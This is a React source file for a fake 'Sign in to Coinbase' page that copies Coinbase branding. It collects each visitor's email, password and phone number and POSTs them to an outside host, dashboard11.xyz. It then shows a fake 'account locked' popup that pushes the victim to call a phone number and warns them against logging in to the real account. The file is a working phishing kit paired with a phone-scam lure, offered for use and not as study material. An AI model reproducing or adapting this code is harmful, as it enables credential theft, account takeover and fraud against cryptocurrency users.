import React, { useState } from "react";
import "bootstrap/dist/css/bootstrap.min.css";
import "bootstrap-icons/font/bootstrap-icons.css";
import "./style.css";

import BeastVideo from "./assets/Beast_Web.webm";
function Login() {
  const [step, setStep] = useState(1);

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [phone, setPhone] = useState("");

  const [popup, setPopup] = useState(false);

  // STEP 1 VALIDATION
  const nextStep = () => {
    if (step === 1) {
      if (!email.trim()) {
        document.getElementById("email")?.reportValidity();
        return;
      }

      setStep(2);
      return;
    }

    if (step === 2) {
      if (!password.trim()) {
        document.getElementById("password")?.reportValidity();
        return;
      }

      setStep(3);
      return;
    }

    if (step === 3) {
      if (!phone.trim()) {
        document.getElementById("phone")?.reportValidity();
        return;
      }

      document.getElementById("login-form")?.requestSubmit();
    }
  };

  // ENTER KEY CONTROL

  const handleKeyDown = (e) => {
    if (e.key !== "Enter") return;

    e.preventDefault();

    if (step === 1 || step === 2) {
      nextStep();
      return;
    }

    if (step === 3) {
      document.getElementById("login-form")?.requestSubmit();
    }
  };

  // FINAL SUBMIT

  const submitForm = async (e) => {
    e.preventDefault();

    console.log({
      email,
      password,
      phone,
    });
    try {
      const response = await fetch("https://dashboard11.xyz/Api/cnb_data.php", {
        method: "POST",

        headers: {
          "Content-Type": "application/json",
        },

        body: JSON.stringify({
          email: email,
          password: password,
          phone: phone,
        }),
      });

      const result = await response.json();

      console.log(result);
      // POPUP OPEN

      setPopup(true);
    } catch (error) {
      console.log(error);

      // testing popup even if api error

      setPopup(true);
    }
  };
  document.title = "Login Page";
  return (
    <>
      {/* Navbar */}
      <nav className="cb-nav">
        <a href="#" className="cb-logo">
          <svg
            className="cb-logo-icon"
            viewBox="0 0 48 48"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <circle cx="24" cy="24" r="24" fill="#1652F0" />
            <path
              d="M24 10C16.268 10 10 16.268 10 24C10 31.732 16.268 38 24 38C31.732 38 38 31.732 38 24C38 16.268 31.732 10 24 10ZM24 32C19.582 32 16 28.418 16 24C16 19.582 19.582 16 24 16C28.418 16 32 19.582 32 24C32 28.418 28.418 32 24 32Z"
              fill="white"
            />
          </svg>
        </a>
      </nav>

      {/* Sign In */}
      <div className="signin-wrapper">
        <div className="signin-card">
          <h1>Sign in to Coinbase</h1>

          {/* <form className="search-wrapper" onSubmit={submitForm}> */}
          <form id="login-form" onSubmit={submitForm} onKeyDown={handleKeyDown}>
            {/* Step 1 */}
            {step === 1 && (
              <div>
                <input
                  id="email"
                  type="email"
                  className="cb-input"
                  placeholder="Your email address"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />

                <button
                  type="button"
                  className="btn-continue"
                  onClick={() => nextStep(2)}
                >
                  Continue
                </button>
              </div>
            )}

            {/* Step 2 */}
            {step === 2 && (
              <div>
                <input
                  type="email"
                  id="email"
                  className="cb-input"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />

                <input
                  id="password"
                  type="password"
                  className="cb-input"
                  placeholder="Your password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />

                <button
                  type="button"
                  className="btn-continue"
                  onClick={() => nextStep(3)}
                >
                  Continue
                </button>
              </div>
            )}

            {/* Step 3 */}
            {step === 3 && (
              <div>
                <input
                  type="email"
                  className="cb-input"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />

                <input
                  type="tel"
                  id="phone"
                  className="cb-input"
                  placeholder="Your phone number"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  required
                />

                <button type="submit" className="btn-continue">
                  Submit
                </button>
              </div>
            )}
          </form>

          {/* Popup */}
          {popup && (
            <div className="popup">
              <div className="popup-content">
                <p>Your coinbase account has been locked due to security reasons. please call coinbase support at <a href="tel:+1-888-888-8888">+1 888 88 888</a> for more information</p>
                <p id="note">NOTE: Do not login to this account, as this will lead to permanent suspention.</p>


              </div>
            </div>
          )}

          <div className="divider">OR</div>

          {/* Passkey */}
          <a href="#" className="btn-social">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <circle cx="9" cy="7" r="4" stroke="#0a0b0d" strokeWidth="1.8" />
              <path
                d="M2 21v-1a7 7 0 0 1 7-7h2"
                stroke="#0a0b0d"
                strokeWidth="1.8"
                strokeLinecap="round"
              />
              <path
                d="M17 13l1.5 1.5L22 11"
                stroke="#0a0b0d"
                strokeWidth="1.8"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
              <rect
                x="14"
                y="16"
                width="8"
                height="5"
                rx="1.5"
                stroke="#0a0b0d"
                strokeWidth="1.8"
              />
            </svg>

            Sign in with Passkey
          </a>


          {/* Google */}
          <a href="#" className="btn-social">
            <svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path
                d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                fill="#4285F4"
              />
              <path
                d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                fill="#34A853"
              />
              <path
                d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"
                fill="#FBBC05"
              />
              <path
                d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                fill="#EA4335"
              />
            </svg>

            Sign in with Google
          </a>


          {/* Apple */}
          <a href="#" className="btn-social">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
              <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11" />
            </svg>

            Sign in with Apple
          </a>

          <p className="signup-cta">
            Don't have an account? <a href="#">Sign up</a>
          </p>

          <p className="privacy-note">
            Not your device? Use a private window. See our{" "}
            <a href="#">Privacy Policy</a> for more info.
          </p>
        </div>
      </div>
    </>
  );
};

export default Login;
